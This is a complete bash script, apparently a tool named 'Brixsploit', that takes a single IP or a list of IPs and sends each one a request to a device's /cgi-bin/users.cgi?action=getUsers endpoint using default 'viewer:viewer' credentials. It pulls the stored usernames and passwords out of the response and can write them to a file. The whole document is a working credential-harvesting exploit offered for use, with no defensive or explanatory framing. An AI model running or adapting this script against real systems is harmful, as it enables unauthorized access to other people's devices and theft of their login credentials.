#!/bin/bash
set -e

echo "______      _                _       _ _   "
echo "| ___ \    (_)              | |     (_) |  "
echo "| |_/ /_ __ ___  _____ _ __ | | ___  _| |_ "
echo "| ___ \ '__| \ \/ / __| '_ \| |/ _ \| | __|"
echo "| |_/ / |  | |>  <\__ \ |_) | | (_) | | |_ "
echo "\____/|_|  |_/_/\_\___/ .__/|_|\___/|_|\__|"
echo "                      | |                  "
echo "                      |_|                  "
echo ""
echo "Made by EMLGaming & M00SE"


function check-ip {
    if [ -z ${OUTPUT+x} ]; then
        echo "$1:"
        try-exploit $1
        echo ""
    else
        echo "$1:" >> "$OUTPUT" 2>&1
        try-exploit $1 >> "$OUTPUT" 2>&1
        echo "" >> "$OUTPUT" 2>&1
    fi
}

function try-exploit {
    curl -s --max-time 10 "http://$1/cgi-bin/users.cgi?action=getUsers" -u "viewer:viewer" | grep -E '(User1.username|User1.password)' | grep -o -E '(userna.*|passwo.*)' || true
}


INTERACTIVE=1

while [[ $# -gt 0 ]]; do
    arg="$1"
    case $arg in
        -h|--help)
            echo "Usage: $0 [Options]"
            echo ""
            echo "Options:"
            echo "  -h, --help                   Prints this help page."
            echo ""
            echo "  -o <file>, --output <file>   Saves results in a file. Disables interactive mode."
            echo "  -r <file>, --read <file>     Reads ip addresses from a file."
            echo ""
            echo "Examples:"
            echo "$0 -r iplist.txt -o results.txt"
            exit
        ;;
        -o|--output)
            OUTPUT="$2"
            shift 2
        ;;
        -r|--read)
            INTERACTIVE=0
            READ_FILE="$2"
            shift 2
        ;;
        *)
            echo "Ignoring parameter ${i}: Unknown parameter"
            shift
        ;;
    esac
done


if [ $INTERACTIVE -eq "1" ]; then
    # Interactive mode
    echo "Enter target ip (e.g. 1.2.3.4:81):"
    read ip
    check-ip $ip
else
    # Read mode
    let x=0 || true # exits script otherwise
    lines="$(wc -l $READ_FILE | tr -dc '[:alnum:]\n\r' | sed 's/[^0-9]*//g')"
    
    while read ip; do
        let x++ || true # exits script otherwise
        echo "Working on IP $ip ($x/$lines)..."
        check-ip $ip
    done <$READ_FILE
fi
